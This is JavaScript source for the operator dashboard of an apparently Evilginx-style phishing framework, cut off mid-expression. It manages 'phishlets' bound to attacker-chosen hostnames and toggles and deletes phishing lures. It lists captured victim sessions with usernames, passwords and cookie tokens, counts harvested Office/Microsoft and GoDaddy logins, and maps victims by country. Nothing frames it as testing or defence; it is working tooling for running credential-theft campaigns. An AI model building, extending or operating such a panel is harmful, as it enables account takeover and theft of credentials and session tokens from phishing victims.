// Main UI elements
const sidebar = document.querySelector('.sidebar');
const content = document.querySelector('.content');
const menuToggle = document.querySelector('.menu-toggle');
const navLinks = document.querySelectorAll('.sidebar-nav a');
const tabContents = document.querySelectorAll('.tab-content');
const logoutBtn = document.getElementById('logout-btn');

// Tab-specific elements
const phishletsTable = document.getElementById('phishlets-table');
const luresTable = document.getElementById('lures-table');
const sessionsTable = document.getElementById('sessions-table');
const phishletsRefreshBtn = document.getElementById('refresh-phishlets');
const luresRefreshBtn = document.getElementById('refresh-lures');
const sessionsRefreshBtn = document.getElementById('sessions-refresh-btn');
const createLureBtn = document.getElementById('create-lure-btn');
const updateCertificatesBtn = document.getElementById('update-certificates-btn');
const lastUpdatedSpan = document.querySelector('.last-updated');

// Dashboard statistics
const phishletsCountElement = document.getElementById('phishlets-count');
const luresCountElement = document.getElementById('lures-count');
const sessionsCountElement = document.getElementById('sessions-count');
const credentialsCountElement = document.getElementById('credentials-count');

// Dashboard statistics elements added
const visitsCountElement = document.getElementById('visits-count');
const successLoginsCountElement = document.getElementById('success-logins-count');
const failedLoginsCountElement = document.getElementById('failed-logins-count');
const officeLoginsCountElement = document.getElementById('office-logins-count');

// Period statistics elements
const todayVisits = document.getElementById('today-visits');
const todaySuccess = document.getElementById('today-success'); 
const todayFailed = document.getElementById('today-failed');
const weekVisits = document.getElementById('week-visits');
const weekSuccess = document.getElementById('week-success');
const weekFailed = document.getElementById('week-failed');
const monthVisits = document.getElementById('month-visits');
const monthSuccess = document.getElementById('month-success');
const monthFailed = document.getElementById('month-failed');

// Base API URL
const API_BASE_URL = window.location.origin + '/api';

// Global variables
let authToken = localStorage.getItem('authToken') || getCookie('Authorization');
let userToken = localStorage.getItem('userToken');
let phishlets = [];
let lures = [];
let sessions = [];
let credentials = [];
let isVerifying = false;
let lastUrl = window.location.href;

// Global map object
let worldMap = null;
let mapData = {};

// Helper function to get cookie value
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Check login status
async function checkAuthentication() {
    console.log('جاري التحقق من حالة المصادقة...');
    
    try {
        // استخراج التوكن من جميع المصادر الممكنة
        const lsAuthToken = localStorage.getItem('authToken');
        const cookieAuthToken = getCookie('Authorization');
        const userToken = localStorage.getItem('userToken');
        
        console.log('توكن المصادقة (localStorage):', lsAuthToken ? 'موجود' : 'غير موجود');
        console.log('توكن المصادقة (cookie):', cookieAuthToken ? 'موجود' : 'غير موجود');
        console.log('توكن المستخدم:', userToken ? 'موجود' : 'غير موجود');
        
        // تعيين توكن المصادقة من أي مصدر متاح
        authToken = lsAuthToken || cookieAuthToken;
        
        // محاولة إجراء طلب اختبار للتحقق من صلاحية التوكن
        if (authToken) {
            console.log('تم العثور على توكن، إرسال طلب اختبار...');
            const headers = getHeaders();
            
            // عرض الهيدرز المستخدمة في الطلب
            console.log('الهيدرز المستخدمة في طلب الاختبار:', headers);
            
            const testResponse = await fetch('/api/dashboard', {
                method: 'GET',
                headers: headers
            });
            
            console.log('استجابة الاختبار:', testResponse.status);
            
            if (testResponse.ok) {
                console.log('التوكن صحيح والمصادقة ناجحة');
                // تأكيد حفظ التوكن في جميع المستودعات
                if (!lsAuthToken && cookieAuthToken) {
                    localStorage.setItem('authToken', cookieAuthToken);
                }
                if (!cookieAuthToken && lsAuthToken) {
                    document.cookie = `Authorization=${lsAuthToken}; path=/; max-age=86400; SameSite=Lax`;
                }
                return Promise.resolve();
            }
        }
        
        // إذا كان لدينا توكن المستخدم ولكن فشل توكن المصادقة، نعيد التحقق
        if (userToken) {
            console.log('توكن المصادقة غير صالح، إعادة التحقق باستخدام توكن المستخدم...');
            
            // محاولة التحقق باستخدام توكن المستخدم
            const verifyResponse = await fetch('/auth/verify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ userToken: userToken })
            });
            
            console.log('استجابة إعادة التحقق:', verifyResponse.status);
            
            if (verifyResponse.ok) {
                const data = await verifyResponse.json();
                
                if (data.success && data.data && data.data.auth_token) {
                    authToken = data.data.auth_token;
                    console.log('تم الحصول على توكن مصادقة جديد', authToken.substring(0, 5) + '...');
                    
                    // حفظ التوكن الجديد في جميع المستودعات
                    localStorage.setItem('authToken', authToken);
                    document.cookie = `Authorization=${authToken}; path=/; max-age=86400; SameSite=Lax`;
                    
                    return Promise.resolve();
                }
            }
        }
        
        // إذا وصلنا إلى هنا، فقد فشلت كل محاولات المصادقة
        console.log('فشلت جميع محاولات المصادقة، إعادة التوجيه إلى صفحة تسجيل الدخول');
        
        // مسح كل البيانات ثم إعادة التوجيه
        localStorage.removeItem('authToken');
        localStorage.removeItem('userToken');
        document.cookie = "Authorization=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        
        // استخدام تأخير قصير لتجنب الحلقات المفرطة
        setTimeout(() => {
            window.location.href = '/static/login.html';
        }, 100);
        
        return Promise.reject(new Error('فشل المصادقة'));
    } catch (error) {
        console.error('خطأ أثناء التحقق من المصادقة:', error);
        
        // مسح كل البيانات ثم إعادة التوجيه
        localStorage.removeItem('authToken');
        localStorage.removeItem('userToken');
        document.cookie = "Authorization=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        
        setTimeout(() => {
            window.location.href = '/static/login.html';
        }, 100);
        
        return Promise.reject(error);
    }
}

// Add authentication header to API requests
function getHeaders() {
    // تحديث توكن المصادقة من جميع المصادر المتاحة
    const lsAuthToken = localStorage.getItem('authToken');
    const cookieAuthToken = getCookie('Authorization');
    
    // استخدام أي توكن متاح
    authToken = lsAuthToken || cookieAuthToken;
    
    const headers = {
        'Content-Type': 'application/json'
    };
    
    if (authToken) {
        // إرسال التوكن في هيدر Authorization بدون أي بادئة
        headers['Authorization'] = authToken;
    }
    
    return headers;
}

// Error handling function
function handleApiError(error) {
    console.error('API Error:', error);
    if (error.status === 401) {
        clearSessionData();
        
        setTimeout(() => {
            window.location.href = '/static/login.html';
        }, 1000);
    }
    showToast('Error', error.message || 'An error occurred while connecting to the server', 'error');
}

// Function to update time
function updateLastUpdated() {
    const now = new Date();
    const options = {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    lastUpdatedSpan.textContent = now.toLocaleTimeString('en-US', options);
}

// Show toast notification
function showToast(title, message, type = 'info') {
    const toastContainer = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    let icon = '';
    switch(type) {
        case 'success': icon = 'fas fa-check-circle'; break;
        case 'error': icon = 'fas fa-exclamation-circle'; break;
        case 'warning': icon = 'fas fa-exclamation-triangle'; break;
        default: icon = 'fas fa-info-circle';
    }
    
    toast.innerHTML = `
        <div class="toast-icon"><i class="${icon}"></i></div>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close"><i class="fas fa-times"></i></button>
    `;
    
    toastContainer.appendChild(toast);
    
    // Remove notification after 5 seconds
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toastContainer.removeChild(toast);
        }, 300);
    }, 5000);
    
    // Close button for notification
    toast.querySelector('.toast-close').addEventListener('click', () => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toastContainer.removeChild(toast);
        }, 300);
    });
}

// ================= API Calls =================

// Fetch Phishlets list
async function fetchPhishlets() {
    try {
        const response = await fetch(`${API_BASE_URL}/phishlets`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Phishlets'
            };
        }
        
        const result = await response.json();
        // Prepare data in appropriate format
        phishlets = Array.isArray(result) ? result : (result.data || []);
        console.log('Received Phishlets:', phishlets);
        return phishlets;
    } catch (error) {
        console.error('Error fetching Phishlets:', error);
        handleApiError(error);
        return [];
    }
}

// Fetch Lures list
async function fetchLures() {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Lures'
            };
        }
        
        const result = await response.json();
        // Prepare data in appropriate format
        lures = Array.isArray(result) ? result : (result.data || []);
        console.log('Received Lures:', lures);
        return lures;
    } catch (error) {
        console.error('Error fetching Lures:', error);
        handleApiError(error);
        return [];
    }
}

// Fetch Sessions list
async function fetchSessions() {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Sessions'
            };
        }
        
        const result = await response.json();
        console.log('Original API response for sessions:', result);
        
        // Prepare data in the appropriate format
        // Check the format of the received data and convert it to a unified format
        sessions = [];
        
        if (sessions.length === 0) {
            if (Array.isArray(result)) {
                sessions = result;
            } else if (result.data) {
                sessions = result.data;
            } else if (typeof result === 'object') {
                // If the response is an object, it might contain sessions
                const possibleArrayKeys = ['sessions', 'data', 'records', 'items'];
                for (const key of possibleArrayKeys) {
                    if (Array.isArray(result[key])) {
                        sessions = result[key];
                        break;
                    }
                }
                
                // If we didn't find an array, the data might be stored as values in the object
                if (sessions.length === 0) {
                    const sessionIds = Object.keys(result);
                    if (sessionIds.length > 0) {
                        sessions = sessionIds.map(id => {
                            const session = result[id];
                            session.id = id;
                            return session;
                        });
                    }
                }
            }
        }
        
        console.log('Processed sessions data:', sessions);
        return sessions;
    } catch (error) {
        console.error('Error fetching Sessions:', error);
        handleApiError(error);
        return [];
    }
}

// Enable or disable Phishlet
async function togglePhishlet(name, enable) {
    try {
        console.log(`Attempting to ${enable ? 'enable' : 'disable'} Phishlet: ${name}`);
        
        // If we're trying to enable, first check if it has a hostname
        if (enable) {
            // Get phishlet information
            const phishletResponse = await fetch(`${API_BASE_URL}/phishlets/${name}`, {
                method: 'GET',
                headers: getHeaders()
            });
            
            if (!phishletResponse.ok) {
                throw new Error(`Failed to get information for Phishlet: ${phishletResponse.statusText}`);
            }
            
            const phishletData = await phishletResponse.json();
            console.log(`Phishlet ${name} data:`, phishletData);
            
            // Check if the phishlet needs a hostname
            if (!phishletData.data.hostname || phishletData.data.hostname === "") {
                // Show prompt for requesting hostname
                const hostname = await showHostnamePrompt(name);
                if (!hostname) {
                    // User canceled the operation
                    return false;
                }
                
                // Update hostname for the phishlet
                const hostnameResponse = await fetch(`${API_BASE_URL}/configs/hostname`, {
                    method: 'POST',
                    headers: {
                        ...getHeaders(),
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phishlet: name,
                        hostname: hostname
                    })
                });
                
                if (!hostnameResponse.ok) {
                    let errorMessage = `Server error: ${hostnameResponse.status}`;
                    try {
                        const responseData = await hostnameResponse.json();
                        if (responseData.message) {
                            errorMessage = responseData.message;
                        }
                    } catch (e) {
                        console.error("Error parsing error response:", e);
                    }
                    
                    throw new Error(`Failed to set hostname: ${errorMessage}`);
                }
                
                console.log(`Hostname set successfully for Phishlet ${name}`);
            }
        }
        
        // Now we proceed to enable/disable the phishlet
        const action = enable ? 'enable' : 'disable';
        const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        // Log full API response for debugging
        console.log(`API response for ${action} Phishlet:`, response);
        
        if (!response.ok) {
            let errorMessage = `Server error: ${response.status}`;
            try {
                const errorData = await response.json();
                if (errorData.message) {
                    errorMessage = errorData.message;
                }
            } catch (e) {
                console.error("Error parsing API error response:", e);
            }
            
            throw new Error(`Failed to ${enable ? 'enable' : 'disable'} Phishlet: ${errorMessage}`);
        }
        
        const data = await response.json();
        console.log(`Full API response for ${action} Phishlet:`, data);
        
        if (data.success) {
            showToast('Success', `Successfully ${enable ? 'enabled' : 'disabled'} Phishlet ${name}`, 'success');
            
            // Check if configurations were saved
            await checkConfigSaved();
            
            return true;
        } else {
            showToast('Error', `Failed to ${enable ? 'enable' : 'disable'} Phishlet: ${data.message || 'Unknown error'}`, 'error');
            return false;
        }
    } catch (error) {
        console.error(`Error in ${enable ? 'enabling' : 'disabling'} Phishlet:`, error);
        showToast('Error', `An error occurred: ${error.message}`, 'error');
        return false;
    }
}

// Show prompt for requesting hostname
async function showHostnamePrompt(phishletName) {
    return new Promise((resolve) => {
        // Create elements
        const modal = document.createElement('div');
        modal.className = 'modal active';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h3>Set Hostname for Phishlet</h3>
                    <button class="modal-close">&times;</button>
                </div>
                <div class="modal-body">
                    <p>You must enter a hostname to enable the phishlet "${phishletName}"</p>
                    <div class="form-group">
                        <label for="hostname-input">Hostname</label>
                        <input type="text" id="hostname-input" class="form-control" placeholder="example.yourdomain.com">
                        <small class="form-text">
                            Enter the subdomain that will be used for this phishlet. 
                            Make sure this domain points to your server.
                        </small>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary cancel-btn">Cancel</button>
                    <button class="btn btn-primary save-btn">Save</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        
        // Focus on input field
        const input = modal.querySelector('#hostname-input');
        setTimeout(() => input.focus(), 100);
        
        // Add event listeners
        const closeBtn = modal.querySelector('.modal-close');
        const cancelBtn = modal.querySelector('.cancel-btn');
        const saveBtn = modal.querySelector('.save-btn');
        
        function close(value = null) {
            document.body.removeChild(modal);
            resolve(value);
        }
        
        closeBtn.addEventListener('click', () => close());
        cancelBtn.addEventListener('click', () => close());
        
        saveBtn.addEventListener('click', () => {
            const hostname = input.value.trim();
            if (!hostname) {
                showToast('Error', 'Please enter a valid hostname', 'error');
                return;
            }
            close(hostname);
        });
        
        // Handle Enter key press in input field
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                saveBtn.click();
            }
        });
    });
}

// Check if changes were saved
async function checkConfigSaved() {
    try {
        // Request to save configuration
        const response = await fetch(`${API_BASE_URL}/config/save`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        const data = await response.json();
        console.log('Configuration save response:', data);
        
        if (data.success) {
            console.log('Configuration saved successfully');
            return true;
        } else {
            console.warn('Failed to save configuration:', data.message);
            return false;
        }
    } catch (error) {
        console.error('Error saving configuration:', error);
        return false;
    }
}

// Show hostname modal
function showHostnameModal(phishletName, callback) {
    // Create modal elements
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>Set Hostname for Phishlet</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <p>You must enter a hostname to enable the phishlet "${phishletName}"</p>
                <div class="form-group">
                    <label for="phishlet-hostname">Hostname</label>
                    <input type="text" id="phishlet-hostname" class="form-control" placeholder="example.yourdomain.com">
                    <small class="form-text">
                        Enter the full domain name that will be used for this phishlet. 
                        Make sure this domain is registered and points to your server.
                    </small>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn-secondary modal-cancel-btn">Cancel</button>
                <button class="btn-primary modal-save-btn">Save and Enable</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // Add event listeners
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-cancel-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
            callback(null); // Cancel the operation
        });
    });
    
    const saveButton = modal.querySelector('.modal-save-btn');
    saveButton.addEventListener('click', function() {
        const hostname = modal.querySelector('#phishlet-hostname').value.trim();
        if (!hostname) {
            showToast('Error', 'Please enter a hostname', 'error');
            return;
        }
        document.body.removeChild(modal);
        callback(hostname);
    });
    
    // Focus on input field
    setTimeout(() => {
        modal.querySelector('#phishlet-hostname').focus();
    }, 100);
}

// Create new Lure
async function createLure(lureData) {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'POST',
            headers: {
                ...getHeaders(),
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(lureData)
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to create Lure'
            };
        }
        
        showToast('Success', 'Successfully created new Lure', 'success');
        return await response.json();
    } catch (error) {
        console.error('Error creating Lure:', error);
        handleApiError(error);
        return null;
    }
}

// Delete Lure
async function deleteLure(id) {
    try {
        console.log(`Attempting to delete Lure with ID ${id}`);
        
        const response = await fetch(`${API_BASE_URL}/lures/${id}`, {
            method: 'DELETE',
            headers: getHeaders()
        });
        
        console.log('Lure delete response:', response);
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to delete Lure'
            };
        }
        
        // Attempt to read the response as JSON
        let responseData;
        try {
            responseData = await response.json();
            console.log('Lure delete response data:', responseData);
        } catch (e) {
            console.log('Unable to read delete response as JSON', e);
        }
        
        return true;
    } catch (error) {
        console.error('Error in deleting Lure:', error);
        handleApiError(error);
        return false;
    }
}

// Populate Session details
async function fetchSessionDetails(id) {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions/${id}`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Session details'
            };
        }
        
        const responseJson = await response.json();
        console.log('Session details response:', responseJson);
        
        // Extract data from Data field in the response
        if (responseJson.success && responseJson.data) {
            return responseJson.data;
        } else {
            return responseJson;
        }
    } catch (error) {
        console.error('Error fetching session details:', error);
        handleApiError(error);
        return null;
    }
}

// Enable or disable Lure
async function toggleLure(id, enable) {
    try {
        console.log(`Attempting to ${enable ? 'enable' : 'disable'} Lure with ID ${id}`);
        
        const action = enable ? 'enable' : 'disable';
        const response = await fetch(`${API_BASE_URL}/lures/${id}/${action}`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        console.log(`API response for ${enable ? 'enabling' : 'disabling'} Lure:`, response);
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: `Failed to ${enable ? 'enable' : 'disable'} Lure`
            };
        }
        
        // Attempt to read the response as JSON
        let responseData;
        try {
            responseData = await response.json();
            console.log(`API response for ${enable ? 'enabling' : 'disabling'} Lure:`, responseData);
        } catch (e) {
            console.log('Unable to read API response as JSON', e);
        }
        
        showToast('Success', `Successfully ${enable ? 'enabled' : 'disabled'} Lure`, 'success');
        return true;
    } catch (error) {
        console.error(`Error in ${enable ? 'enabling' : 'disabling'} Lure:`, error);
        handleApiError(error);
        return false;
    }
}

// ================= UI Functions =================

// Calculate statistics based on session data
function calculateStatistics(sessionsData) {
    const stats = {
        totalVisits: sessionsData.length,
        successfulLogins: 0,
        failedLogins: 0,
        officeLogins: 0,
        godaddyLogins: 0,
        
        // Time period stats
        today: {
            visits: 0,
            success: 0,
            failed: 0
        },
        week: {
            visits: 0,
            success: 0,
            failed: 0
        },
        month: {
            visits: 0,
            success: 0,
            failed: 0
        }
    };
    
    // Current date for period calculations
    const now = new Date();
    const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
    const weekStart = new Date(now.getFullYear(), now.getMonth(), now.getDate() - now.getDay()).getTime();
    const monthStart = new Date(now.getFullYear(), now.getMonth(), 1).getTime();
    
    sessionsData.forEach(session => {
        // Convert timestamp to date object
        let timestamp = 0;
        if (session.create_time) timestamp = session.create_time * 1000;
        else if (session.CreateTime) timestamp = session.CreateTime * 1000;
        else if (session.created) timestamp = session.created;
        else if (session.timestamp) timestamp = session.timestamp;
        
        // Period statistics
        if (timestamp >= todayStart) {
            stats.today.visits++;
        }
        if (timestamp >= weekStart) {
            stats.week.visits++;
        }
        if (timestamp >= monthStart) {
            stats.month.visits++;
        }
        
        // Check for successful login
        const hasUsername = session.username && session.username.length > 0;
        const hasPassword = session.password && session.password.length > 0;
        
        if (hasUsername && hasPassword) {
            stats.successfulLogins++;
            
            // Check for period
            if (timestamp >= todayStart) {
                stats.today.success++;
            }
            if (timestamp >= weekStart) {
                stats.week.success++;
            }
            if (timestamp >= monthStart) {
                stats.month.success++;
            }
            
            // Check for service type
            const username = (session.username || '').toLowerCase();
            const phishlet = (session.phishlet || '').toLowerCase();
            
            if (username.includes('@') && (
                username.endsWith('@microsoft.com') || 
                username.endsWith('@outlook.com') || 
                username.endsWith('@hotmail.com') || 
                username.endsWith('@live.com') ||
                phishlet.includes('office') || 
                phishlet.includes('microsoft') || 
                phishlet.includes('o365')
            )) {
                stats.officeLogins++;
            }
            
            if (username.includes('@') && (
                phishlet.includes('godaddy') || 
                username.includes('godaddy')
            )) {
                stats.godaddyLogins++;
            }
        } else if (hasUsername || hasPassword) {
            // Partial credentials - failed login
            stats.failedLogins++;
            
            // Check for period
            if (timestamp >= todayStart) {
                stats.today.failed++;
            }
            if (timestamp >= weekStart) {
                stats.week.failed++;
            }
            if (timestamp >= monthStart) {
                stats.month.failed++;
            }
        }
    });
    
    return stats;
}

// Enhanced update dashboard function
async function updateDashboard() {
    try {
        updateLastUpdated();
        
        // Fetch data from API
        const [phishletsData, luresData, sessionsData] = await Promise.all([
            fetchPhishlets(),
            fetchLures(),
            fetchSessions()
        ]);
        
        // Update statistics
        phishletsCountElement.textContent = phishletsData.length;
        luresCountElement.textContent = luresData.length;
        sessionsCountElement.textContent = sessionsData.length;
        
        // Calculate logged in credentials count
        let credCount = 0;
        sessionsData.forEach(session => {
            if (session.username && session.password) {
                credCount++;
            }
        });
        credentialsCountElement.textContent = credCount;
        
        // Calculate and display extended statistics
        const stats = calculateStatistics(sessionsData);
        
        // Update main stats
        visitsCountElement.textContent = stats.totalVisits;
        successLoginsCountElement.textContent = stats.successfulLogins;
        failedLoginsCountElement.textContent = stats.failedLogins;
        officeLoginsCountElement.textContent = stats.officeLogins;
        
        // Update period stats
        todayVisits.textContent = stats.today.visits;
        todaySuccess.textContent = stats.today.success;
        todayFailed.textContent = stats.today.failed;
        
        weekVisits.textContent = stats.week.visits;
        weekSuccess.textContent = stats.week.success;
        weekFailed.textContent = stats.week.failed;
        
        monthVisits.textContent = stats.month.visits;
        monthSuccess.textContent = stats.month.success;
        monthFailed.textContent = stats.month.failed;
        
        // Update recent sessions table
        const recentSessionsTable = document.getElementById('recent-sessions-table');
        if (recentSessionsTable) {
            populateRecentSessionsTable(recentSessionsTable, sessionsData.slice(0, 5));
        }
        
        // Extract country data and update the map
        const countryData = extractCountryData(sessionsData);
        if (worldMap) {
            updateWorldMap(countryData);
        }
    } catch (error) {
        console.error('Error updating dashboard:', error);
        showToast('Error', 'Failed to update dashboard', 'error');
    }
}

// Populate recent sessions table
function populateRecentSessionsTable(tableElement, sessions) {
    const tbody = tableElement.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!sessions || sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">No logged sessions</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    sessions.forEach(session => {
        // Ensure all required data is present
        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'Unknown';
        const phishlet = session.phishlet || session.Phishlet || '';
        const username = session.username || session.Username || session.user || session.User || session.login || 'Not logged in';
        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'Unknown';
        
        // Attempt to find creation time, it might be in multiple fields
        let created = null;
        if (session.create_time) created = session.create_time * 1000; // Convert from seconds to milliseconds
        else if (session.CreateTime) created = session.CreateTime * 1000;
        else if (session.created) created = session.created;
        else if (session.timestamp) created = session.timestamp;
        else if (session.time) created = session.time;
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${sessionId}</td>
            <td>${phishlet}</td>
            <td>${username}</td>
            <td>${ip}</td>
            <td>${formatDate(created)}</td>
        `;
        tbody.appendChild(tr);
    });
}

// Populate Phishlets table
function populatePhishletsTable(phishlets) {
    const tbody = phishletsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!phishlets || phishlets.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">No phishlets</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('Received Phishlets data:', phishlets);
    
    phishlets.forEach(phishlet => {
        const tr = document.createElement('tr');
        // Ensure all required properties are present
        const name = phishlet.name || phishlet.id || '';
        const author = phishlet.author || '';
        const hostname = phishlet.hostname || '';
        
        // Check activation status - it might be in any of these fields
        const enabled = phishlet.is_active === true || phishlet.isActive === true || phishlet.IsActive === true || phishlet.enabled === true;
        
        tr.innerHTML = `
            <td>${name}</td>
            <td>${author}</td>
            <td>${hostname || 'Not specified'}</td>
            <td><span class="badge ${enabled ? 'badge-success' : 'badge-danger'}">${enabled ? 'Enabled' : 'Disabled'}</span></td>
            <td class="action-buttons">
                <button class="btn btn-sm ${enabled ? 'btn-danger' : 'btn-success'}" data-action="${enabled ? 'disable' : 'enable'}" data-name="${name}">
                    <i class="fas fa-${enabled ? 'power-off' : 'play'}"></i>
                    ${enabled ? 'Disable' : 'Enable'}
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // Add event listeners for enable/disable buttons
    const actionButtons = tbody.querySelectorAll('[data-action]');
    actionButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const name = this.dataset.name;
            const action = this.dataset.action;
            
            if (action === 'enable') {
                const success = await togglePhishlet(name, true);
                if (!success) return;
            } else if (action === 'disable') {
                const success = await togglePhishlet(name, false);
                if (!success) return;
            }
            
            // Update Phishlets table
            const updatedPhishlets = await fetchPhishlets();
            populatePhishletsTable(updatedPhishlets);
        });
    });
}

// Populate Lures table
function populateLuresTable(lures) {
    const tbody = luresTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!lures || lures.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="6" class="text-center">No lures</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('Full Lures data:', lures);
    
    lures.forEach((lure, index) => {
        // Ensure all required data is present
        const id = lure.id || index;
        const phishlet = lure.phishlet || '';
        const hostname = lure.hostname || '';
        const path = lure.path || '/';
        const redirectUrl = lure.redirect_url || lure.RedirectUrl || '';
        
        // Check if the lure is enabled or disabled
        const isEnabled = !lure.PausedUntil || lure.PausedUntil === 0 || lure.PausedUntil < Date.now()/1000;
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${id}</td>
            <td>${phishlet}</td>
            <td>${hostname}</td>
            <td>${path}</td>
            <td>${redirectUrl}</td>
            <td>
                <span class="badge ${isEnabled ? 'badge-success' : 'badge-danger'}">
                    ${isEnabled ? 'Enabled' : 'Disabled'}
                </span>
            </td>
            <td class="action-buttons">
                <button class="btn btn-sm ${isEnabled ? 'btn-danger' : 'btn-success'} toggle-lure-btn" data-index="${index}" data-action="${isEnabled ? 'disable' : 'enable'}">
                    <i class="fas fa-${isEnabled ? 'power-off' : 'play'}"></i>
                    ${isEnabled ? 'Disable' : 'Enable'}
                </button>
                <button class="btn btn-sm btn-danger delete-lure-btn" data-index="${index}">
                    <i class="fas fa-trash-alt"></i> Delete
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // Add event listeners for enable/disable buttons
    const toggleButtons = tbody.querySelectorAll('.toggle-lure-btn');
    toggleButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const index = Number(this.dataset.index);
            const action = this.dataset.action;
            const enable = action === 'enable';
            
            try {
                // Show loading spinner
                showToast('Processing', `Processing ${enable ? 'enabling' : 'disabling'} Lure...`, 'info');
                
                // Attempt to enable/disable the lure
                const success = await toggleLure(index, enable);
                
                if (success) {
                    // Update Lures table
                    const updatedLures = await fetchLures();
                    populateLuresTable(updatedLures);
                }
            } catch (error) {
                console.error(`Error in ${enable ? 'enabling' : 'disabling'} Lure:`, error);
                showToast('Error', `An error occurred while ${enable ? 'enabling' : 'disabling'} Lure`, 'error');
            }
        });
    });
    
    // Add event listeners for delete buttons
    const deleteButtons = tbody.querySelectorAll('.delete-lure-btn');
    deleteButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const index = Number(this.dataset.index);
            if (confirm('Are you sure you want to delete this Lure?')) {
                try {
                    // Show loading spinner
                    showToast('Processing', 'Processing Lure deletion...', 'info');
                    
                    // Attempt to delete the lure
                    const success = await deleteLure(index);
                    
                    if (success) {
                        // Update Lures table
                        const updatedLures = await fetchLures();
                        populateLuresTable(updatedLures);
                        // Update statistics
                        updateDashboard();
                        
                        showToast('Success', 'Successfully deleted Lure', 'success');
                    } else {
                        showToast('Error', 'Failed to delete Lure', 'error');
                    }
                } catch (error) {
                    console.error('Error in deleting Lure:', error);
                    showToast('Error', 'An error occurred while deleting Lure', 'error');
                }
            }
        });
    });
}

// Populate Sessions table
function populateSessionsTable(sessions) {
    const tbody = sessionsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!sessions || sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="7" class="text-center">No logged sessions</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('Full sessions data:', sessions);
    
    sessions.forEach(session => {
        // Ensure all required data is present using all possible identifiers
        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'Unknown';
        const phishlet = session.phishlet || session.Phishlet || '';
        const username = session.username || session.Username || session.user || session.User || session.login || 'Not logged in';
        const password = session.password || session.Password || session.pass || session.Pass || 'Not logged in';
        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'Unknown';
        
        // Attempt to find creation time, it might be in multiple fields
        let created = null;
        if (session.create_time) created = session.create_time * 1000; // Convert from seconds to milliseconds
        else if (session.CreateTime) created = session.CreateTime * 1000;
        else if (session.created) created = session.created;
        else if (session.timestamp) created = session.timestamp;
        else if (session.time) created = session.time;
        
        // Check for presence of credentials
        const hasCredentials = (
            (session.tokens && Object.keys(session.tokens).length > 0) || 
            (session.Tokens && Object.keys(session.Tokens).length > 0) ||
            (session.CookieTokens && Object.keys(session.CookieTokens).length > 0) ||
            username !== 'Not logged in' || 
